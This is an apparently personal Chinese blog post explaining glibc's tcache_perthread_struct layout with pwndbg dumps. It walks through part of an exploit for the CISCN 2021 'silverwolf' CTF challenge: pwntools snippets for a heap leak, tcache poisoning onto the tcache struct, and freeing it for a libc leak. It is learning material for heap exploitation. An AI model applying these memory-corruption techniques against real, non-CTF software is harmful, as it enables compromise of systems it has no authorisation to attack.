---
title: 'tcache_perthread_struct 结构体原理与堆利用示例'
description: '记录 glibc tcache_perthread_struct 的结构布局、tcache bins 地址关系、伪造 chunk 思路，以及 CISCN 2021 silverwolf 例题利用过程。'
tags:
  - heap
  - glibc
  - tcache
  - pwn
categories:
  - pwn
date: '2025-09-27 18:08:22'
abbrlink: 3fe67e4b
permalink: posts/tcache-perthread-struct-heap-exploitation/
top_img: transparent
---
tcache_perthread_struct 是<font style="color:rgb(78, 161, 219) !important;">GLIBC</font><font style="color:rgb(77, 77, 77);">从2.27开始引入的机制，用于 add 有限的 chuank 数量，可以申请的 size 过小无法 free 到unsorted bin。</font>

<font style="color:rgb(77, 77, 77);"></font>

#### <font style="color:rgb(77, 77, 77);">tcache的结构体定义</font>
```python
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

<font style="color:rgb(77, 77, 77);">tcache_perthread_struct 在本质上是一个 0x250-0x290的堆结构</font>

<font style="color:rgb(77, 77, 77);"></font>

```python
pwndbg> x/20gx 0x405000
0x405000:	0x0000000000000000	0x0000000000000251
0x405010:	0x0000000000000000	0x0000000000000000
0x405020:	0x0000000000000000	0x0000000000000000
0x405030:	0x0000000000000000	0x0000000000000000
0x405040:	0x0000000000000000	0x0000000000000000
0x405050:	0x0000000000000000	0x0000000000000000
0x405060:	0x0000000000000000	0x0000000000000000
0x405070:	0x0000000000000000	0x0000000000000000
0x405080:	0x0000000000000000	0x0000000000000000
0x405090:	0x0000000000000000	0x0000000000000000
```

<font style="color:rgb(77, 77, 77);">假设这是我们的tcache_perthread_struct 的结构体内容</font>

<font style="color:rgb(77, 77, 77);">在0x405010 中的0x0000000000000000 可以分别对应为</font>

<font style="color:rgb(77, 77, 77);">如果现在我们申请一个</font>0x80、0x60、0x40、0x20 大小的 chunk 并且释放则会变为

<font style="color:rgb(77, 77, 77);">0x0100010001000100</font>

| <font style="color:rgb(77, 77, 77);">0x01</font> | 0x00 | <font style="color:rgb(77, 77, 77);">0x01</font> | 0x00 | <font style="color:rgb(77, 77, 77);">0x01</font> | <font style="color:rgb(77, 77, 77);">0x00</font> | <font style="color:rgb(77, 77, 77);">0x01</font> | 0x00 |
| :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
| <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">0x80</font> | <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">0x70</font> | <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">0x60</font> | <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">0x50</font> | <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">0x40</font> | <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">0x30</font> | <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">0x20</font> | <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">0x10</font> |


<font style="color:rgb(77, 77, 77);">每两个字节对应一个tcache 的 size 大小</font>

```python
pwndbg> x/20gx 0x405000
0x405000:	0x0000000000000000	0x0000000000000251
0x405010:	0x0100010001000100	0x0000000000000000
0x405020:	0x0000000000000000	0x0000000000000000
0x405030:	0x0000000000000000	0x0000000000000000
0x405040:	0x0000000000000000	0x0000000000000000
0x405050:	0x0000000000000000	0x0000000000405a20
0x405060:	0x0000000000000000	0x0000000000405a50
0x405070:	0x0000000000000000	0x0000000000405aa0
0x405080:	0x0000000000000000	0x0000000000405b10
0x405090:	0x0000000000000000	0x0000000000000000
```

<font style="color:rgb(77, 77, 77);"></font>

<font style="color:rgb(77, 77, 77);">从0x405050 开始存储对应大小 chunk 的地址信息</font>

```python
pwndbg> x/20gx 0x405000
0x405000:	0x0000000000000000	0x0000000000000251
0x405010:	0x0100010001000100	0x0000000000000000
0x405020:	0x0000000000000000	0x0000000000000000
0x405030:	0x0000000000000000	0x0000000000000000
0x405040:	0x0000000000000000	0x0000000000000000
0x405050:	0x0000000000000000	0x0000000000405a20
            #0x10				#0x20
0x405060:	0x0000000000000000	0x0000000000405a50
            #0x30				#0x40
0x405070:	0x0000000000000000	0x0000000000405aa0
            #0x50				#0x60
0x405080:	0x0000000000000000	0x0000000000405b10
            #0x70				#0x80
```

#### 利用
我们需要控制一个 chunk 的 fd 或者 bk 位于<font style="color:rgb(77, 77, 77);">tcache_perthread_struct 的地址以便于我们申请出来进行修改里面的值</font>

<font style="color:rgb(77, 77, 77);"></font>

#### <font style="color:rgb(77, 77, 77);">例题</font>
[CISCN 2021 初赛]silverwolf RedLeaves

![](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/tcache_perthread_struct_0.png)

经典的增删改查

![](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/tcache_perthread_struct_1.png)

add 对 size 进行了大小的限制

![](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/tcache_perthread_struct_2.png)

只可以对 index 为 0 的 chunk 进行操作

![](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/tcache_perthread_struct_3.png)

![](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/tcache_perthread_struct_4.png)

<font style="color:rgb(77, 77, 77);">因为在 add 中对输入的 size 大小进行了限制，且一直只能对 index 为 0 的 chunk 进行操作  
</font><font style="color:rgb(77, 77, 77);">所以我们可以利用tcache_perthread_struct 进行操作</font>

<font style="color:rgb(77, 77, 77);">第一步我们需要获取到 heap 的地址信息去计算出tcache_perthread_struct 对应的地址信息</font>

<font style="color:rgb(77, 77, 77);">我们只需要申请一个 chunk 并且 free 掉即可获取到 heap 的地址信息，</font>

```python
add(0x78)
delete()
show()
rl(b'Content: ')
heap_base = u64(p.recv(6).ljust(8, b'\x00'))
print(f'heap_base: {hex(heap_base)}')
tcache_addr = heap_base - 0x11b0
print(f'tcache_addr: {hex(tcache_addr)}')
#计算该chunk的fd到tcache_perthread_struct的距离
#例如
#heap_base: 0x55d11c8791b0
#tcache_addr: 0x55d11c878000
```

将tcache_addr 的地址+0x10 放入 fd 中(<font style="color:rgb(77, 77, 77);">tcachebin 中存入的地址是 data 的地址，所以要将tcache_addr+0x10 后续 add 即可获取到tcache_addr 地址</font>)

```python
edit(p64(heap_base + 0x10)) 
add(0x78)
add(0x78)
edit(p64(0) * 4 + p64(0x0000000700000000))
```

将<font style="color:rgb(77, 77, 77);">tcache_addr 申请出来并且修改对应存放 0x250 数量的标志位改为 7</font>

```python
pwndbg> x/20gx 0x405000
0x405000:	0x0000000000000000	0x0000000000000251
0x405010:	0x0000000000000000	0x0000000000000000
0x405020:	0x0000000000000000	0x0000000000000000
0x405030:	0x0000000700000000	0x0000000000000000
0x405040:	0x0000000000000000	0x0000000000000000
0x405050:	0x0000000000000000	0x0000000000000000
0x405060:	0x0000000000000000	0x0000000000000000
0x405070:	0x0000000000000000	0x0000000000000000
0x405080:	0x0000000000000000	0x0000000000000000
0x405090:	0x0000000000000000	0x0000000000000000
```

![](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/tcache_perthread_struct_5.png)

我们将tcache_addr 申请出来的<font style="color:rgb(77, 77, 77);">tcache_perthread_struct 结构体将其 free 掉(本身也是一个 0x250 大小的 chunk)</font>

<font style="color:rgb(77, 77, 77);">即可进入unsorted bin 进行泄露 libc 地址</font>

